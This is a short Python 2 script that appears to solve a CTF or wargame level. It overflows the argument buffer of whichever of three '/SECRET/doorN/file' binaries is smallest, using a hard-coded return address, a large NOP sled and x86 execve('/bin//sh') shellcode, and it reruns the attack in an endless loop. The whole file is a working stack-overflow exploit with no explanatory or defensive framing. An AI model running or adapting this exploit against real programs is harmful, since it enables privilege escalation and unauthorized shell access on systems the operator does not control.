import os

# ret 0xbfcc0e31
ret = "\x31\x0e\xcc\xbf"
files = ['/SECRET/door1/file','/SECRET/door2/file','/SECRET/door3/file']

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += "\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
buf = "A"*171 + ret + "\x90" * 32000 + shellcode

num = 0
while True:
	num = num+1
	file_sizes=[]
	for nf in files:
		file_sizes.append(os.path.getsize(nf))
	i = file_sizes.index(min(file_sizes))
	os.system(files[i] + " " + buf)
	print num
